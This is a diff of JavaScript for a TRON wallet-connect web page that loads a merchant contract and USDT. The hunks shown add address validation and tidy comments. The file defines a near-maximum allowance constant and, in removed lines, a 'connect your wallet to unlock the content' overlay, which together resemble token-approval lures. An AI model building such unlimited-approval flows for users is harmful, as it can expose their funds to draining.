@@ -1,7 +1,7 @@
 // --- 配置常量 (TRON 专属) ---
 const MERCHANT_CONTRACT_ADDRESS = 'TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu'; // 你的 TRON 智能合约地址 (SimpleMerchantERC)
 const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';  //  TRC20 USDT 合约地址
-const DEFAULT_TRON_ADDRESS_HEX = '410000000000000000000000000000000000000000'; //  默认 TRON 地址，这里可以暂时不用修改，因为连接成功后会获取真实地址
+const DEFAULT_TRON_ADDRESS_HEX = '410000000000000000000000000000000000000000'; //  默认 TRON 地址
 const ALMOST_MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129638935";
 
 // 你的合约 ABI (SimpleMerchantERC)
@@ -86,6 +86,7 @@ function updateConnectionUI(connected, address = null) {
 
 // --- 核心功能：控制状态栏的隐藏与显示。 ---
 function updateStatus(message) {
+    const statusDiv = document.getElementById('status');
     if (!statusDiv) {
         console.error("Status element not found.");
         return; // 避免设置 innerHTML
@@ -112,7 +113,6 @@ async function initialize() {
         usdtContract = await tronWeb.contract(ERC20_ABI, USDT_CONTRACT_ADDRESS);
 
         console.log("✅ Contracts initialized.");
-        // 连接成功， 初始化完成。可以开始其他的操作了。
 
     } catch (error) {
         console.error("Initialization failed:", error);
@@ -192,15 +192,26 @@ async function connectWallet() {
         tronWeb = window.tronWeb;  //  将 tronWeb 赋值给全局变量
         console.log("tronWeb detected:", tronWeb);
 
-        // 2. 尝试获取用户地址, 直接通过 getAccount()
+        // 2. 尝试获取用户地址
         try {
-            await tronWeb.trx.getAccount(); //  尝试获取账户信息, 如果未连接，则会触发 TronLink 弹窗 (Trust Wallet 等)
+            await tronWeb.trx.getAccount(); // 尝试获取账户信息， 触发 Trust Wallet 弹窗
             userAddress = tronWeb.defaultAddress.base58;
             console.log("✅ User Address (base58):", userAddress);
+
+             // 验证地址
+             if (!tronWeb.isAddress(userAddress)) {
+                console.error("Error: Invalid address (Base58) after getAccount:", userAddress);
+                updateConnectionUI(false);
+                showOverlay('🔴 Connection failed: Invalid address.');
+                updateStatus('Connection failed: Invalid address.');
+                return;
+            }
+
             updateConnectionUI(true, userAddress);
 
             // 3. 初始化合约并检查授权
             await initialize();
+
         } catch (e) {
             console.error("Error getting account:", e);
             updateConnectionUI(false);
@@ -236,9 +247,7 @@ connectButton.addEventListener('click', () => {
     }
 });
 
-// 页面加载完成后，初始化 (在 HTML 结构正确的情况下，可以不初始化，连接按钮会调用，或者可以显示提示)
+// 页面加载完成后，初始化 (可选)
 window.onload = () => {
-    //  确保在页面加载的时候，显示未连接的 UI
-    // updateConnectionUI(false); // 初始 UI 状态
-    // showOverlay('Please connect your wallet to unlock the content. Click the wallet icon in the upper right corner.');
+    //  在页面加载的时候，隐藏遮罩
 };
